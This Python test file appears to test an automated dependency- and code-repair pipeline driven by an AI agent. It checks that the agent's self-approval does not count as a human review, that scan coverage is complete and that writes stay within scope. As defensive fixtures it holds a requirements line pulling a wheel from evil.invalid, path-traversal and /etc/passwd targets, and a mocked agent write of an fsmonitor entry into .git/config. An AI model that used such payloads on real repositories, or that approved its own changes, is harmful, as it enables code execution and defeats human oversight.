"""Properties of the four causes found by the adversarial review of M2. Each test states a cause's rule, not a patch:
the earlier findings are instances of it."""
import json
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent))
from fixture import raises, run  # noqa: E402
from sim import HEAD, Sim  # noqa: E402
from ops import agent, lifecycle, probes  # noqa: E402
from ops.node import Node  # noqa: E402
from tcb.floor0 import LINE  # noqa: E402


# ---- cause 1: a fact exists only about a subject the journal names --------------------------------------------
def test_pull_requests_nobody_declared_are_never_asked_about():
    with Sim({"vulns": "found:1"}) as sim:
        sim.world.pulls["666"] = {"head": "e" * 40, "base": "main", "merged": False, "open": True,
                                  "same_repo": False, "files": ["requirements.txt"]}
        sim.world.runs["e" * 40] = "success"
        for _ in range(3):
            s = sim.cycle(minutes=400)
        assert ("pull", "666") not in sim.world.asked and not sim.world.pulls["666"]["merged"]
        assert all(it["args"]["pr"] == "7" for it in s["intents"].values())


def test_a_declared_commit_that_moved_is_another_subject():
    with Sim({"vulns": "found:1"}) as sim:
        sim.cycle()
        sim.world.runs[HEAD] = "success"
        sim.world.pulls["7"].update(head="f" * 40)                     # force-pushed after declaration
        s = sim.cycle(minutes=400)
        assert not s["intents"]
        assert s["observations"][f"repo:deps:vulns/pr/7/{HEAD}|state|scanner"]["status"] == "moved"


def test_a_review_is_a_signed_human_fact_never_the_agents_nor_githubs():
    with Sim({"sast": "found:1"}) as sim:
        sim.cycle()
        sim.world.pulls["7"]["files"] = ["app/service.py"]               # code scope: needs a review
        sim.world.runs[HEAD] = "success"
        s = sim.cycle(minutes=400)
        assert not s["intents"]
        n = sim.node()
        try:                                                           # the agent approving itself counts for nothing
            from ops.cycle import observe
            subject = lifecycle.declared(n.state)[0]
            observe(n, "agent", subject.resource, "review", "approved", level="unknown")
        finally:
            n.close()
        s = sim.cycle(minutes=400)
        assert not s["intents"]
        sim.run("review", pr="7")
        s = sim.cycle()
        assert list(s["executed"].values()) == ["ok"]


def test_a_truncated_file_list_is_never_dependency_scope():
    from ops.cycle import subject_facts
    world = type("W", (), {"pull": lambda self, n: {"head": HEAD, "base": "main", "merged": False, "open": True,
                                                    "same_repo": True, "changed": 2},
                           "ci": lambda self, sha: "success", "files": lambda self, n: ["requirements.txt"]})()
    assert subject_facts(world, lifecycle.subject_of(f"repo:deps:vulns/pr/7/{HEAD}"))["scope"] == "code"


# ---- cause 2: a pass is a proof of coverage ----------------------------------------------------------------------
def test_only_full_coverage_without_findings_passes():
    M = probes.Measure
    assert probes.verdict("none", M(frozenset("ab"), frozenset("ab"))) == "none"
    assert probes.verdict("none", M(frozenset("ab"), frozenset("a"))) == "uncovered:1"
    assert probes.verdict("none", M(frozenset(), frozenset())) == "uncovered:empty"
    assert probes.verdict("none", RuntimeError("tool crashed")) == "uncovered:RuntimeError"
    assert probes.verdict("none", M(frozenset("a"), frozenset("a"), ("x",))) == "found:1"
    assert not probes.repairable("uncovered:1") and probes.repairable("found:1")


def repo_with(files: dict) -> Path:
    d = Path(tempfile.mkdtemp())
    for name, content in files.items():
        (d / name).write_bytes(content if isinstance(content, bytes) else content.encode())
    subprocess.run(["git", "init", "-q"], cwd=d, check=True)
    subprocess.run(["git", "add", "-A"], cwd=d, check=True)
    return d


def test_every_probe_failure_mode_is_uncovered_not_a_pass():
    from tcb.floors import FLOORS
    targets = {t["id"]: t for t in FLOORS["targets"]}
    repo = repo_with({"requirements.txt": "flask==2.2.2\npkg @ https://evil.invalid/x.whl\n"})
    status = probes.measure_all(repo, None, targets)
    assert all(not st == targets[t]["expect"] for t, st in status.items() if t in ("vulns", "deps-age", "licenses",
                                                                                   "sbom", "ci", "branch")), status
    skipped = type("R", (), {"returncode": 0, "stdout": json.dumps({"dependencies": [
        {"name": "flask", "version": "2.2.2", "skip_reason": "x", "vulns": []}]})})()
    with patch.object(probes, "_run", lambda cmd, cwd: skipped):
        m = probes.vulns(repo_with({"requirements.txt": "flask==2.2.2\n"}))
    assert probes.verdict("none", m) == "uncovered:1"


def test_secrets_cover_every_text_file_and_name_what_they_skip():
    repo = repo_with({"my config.py": 'API_KEY = "abcdefghijklmnop1234"\n', "logo.png": b"\x89PNG\0" + b"\0" * 100,
                      "big.txt": "x" * (probes.MAX_TEXT + 1)})
    m = probes.secrets(repo)
    assert m.universe == {"my config.py", "big.txt"} and m.findings
    assert probes.verdict("none", m) == "uncovered:1"                    # the large text was not scanned


# ---- cause 3: hostile data stays data; each role holds only its own ----------------------------------------------
def test_a_repair_writes_only_inside_its_targets_scope():
    for path in (".git/config", "a/.git/x.py", "../x.py", "/etc/passwd", ".github/workflows/standard.yml",
                 "tests/test_service.py", "app/service.py"):
        assert not agent.in_scope("vulns", path), path
    assert agent.in_scope("sast", "app/service.py") and not agent.in_scope("sast", ".github/workflows/ci.yml")
    assert agent.in_scope("actions", ".github/workflows/ci.yml")
    with patch.object(agent, "claude", lambda prompt, key: {"files": {".git/config": "[core]\nfsmonitor=x\n"}}):
        with raises(ValueError, "write scope"):
            agent.craft(Path("."), "sast", "found:1", "k")


def test_a_replaced_state_is_refused_without_the_external_genesis_pin():
    with Sim() as sim:
        with raises(ValueError, "externally pinned genesis"):
            Node(sim.state, sim.keys)
        with raises(ValueError, "externally pinned genesis"):
            Node(sim.state, sim.keys, expected_genesis="sha256:" + "1" * 64)


def test_a_child_route_needs_a_typed_child():
    from tcb.law import _ops, _reaches
    ops = _ops({"noop": {"args": {"x": "segment"}, "resource": "{x}/noop", "profile": "capability"}})
    assert not _reaches(ops["noop"], "payroll")


# ---- cause 4: the next step is the kernel's automaton, exhaustively ----------------------------------------------
def test_every_state_of_the_effect_line_has_one_next_step():
    assert set(lifecycle.NEXT) == lifecycle.STATES, lifecycle.STATES ^ set(lifecycle.NEXT)
    assert {to for _, to in LINE.values()} <= lifecycle.STATES


def test_a_refused_merge_is_asked_again_and_an_unknown_one_is_reconciled():
    with Sim({"vulns": "found:1"}) as sim:
        sim.cycle()
        sim.world.runs[HEAD] = "success"
        outcomes = ["failed", "ok-late"]

        def merge(r, args, k):
            result = outcomes.pop(0)
            if result == "ok-late":                                       # merged, but the adapter cannot tell
                sim.world.pulls["7"].update(merged=True, open=False)
                return "unknown"
            return result
        sim.merge = merge
        s = sim.cycle(minutes=400)
        first = next(iter(s["intents"]))
        assert s["line"][first]["state"] == "failed"
        s = sim.cycle()                                                   # state seen again, then asked again
        retry = next(i for i in s["intents"] if i != first)
        assert s["intents"][retry]["stmt"]["retry_of"] == first and s["line"][retry]["state"] == "uncertain"
        s = sim.cycle()
        assert s["line"][retry]["state"] == "proving" and f"proof:{retry}" not in s["obligations"]


def test_a_guard_that_dies_after_its_reservation_does_not_stall_the_target():
    class Crash(BaseException):
        pass

    with Sim({"vulns": "found:1"}) as sim:
        sim.cycle()
        sim.world.runs[HEAD] = "success"

        def dies(*a):
            raise Crash()
        sim.merge = dies
        try:
            sim.cycle(minutes=400)
        except Crash:
            pass
        sim.merge = sim.world.merge
        s = sim.cycle(minutes=10)                                         # expired -> reconciled: not applied
        first = min(s["intents"], key=lambda i: s["intents"][i]["stmt"]["at"])
        assert s["line"][first]["state"] == "failed"
        s = sim.cycle()
        assert list(s["executed"].values()).count("ok") == 1 and sim.world.pulls["7"]["merged"]


if __name__ == "__main__":
    run(globals())
